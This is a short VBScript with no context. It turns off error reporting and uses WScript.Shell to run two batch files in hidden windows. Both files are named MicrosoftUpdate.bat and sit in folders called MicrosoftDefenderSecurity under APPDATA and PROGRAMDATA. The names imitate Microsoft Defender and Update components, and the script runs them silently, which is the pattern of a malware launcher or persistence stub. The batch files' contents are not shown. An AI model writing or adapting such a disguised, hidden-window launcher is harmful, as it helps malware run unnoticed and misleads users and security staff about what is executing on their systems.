On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftUpdate.bat",0,True
WshShell.Run "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftUpdate.bat",0,True
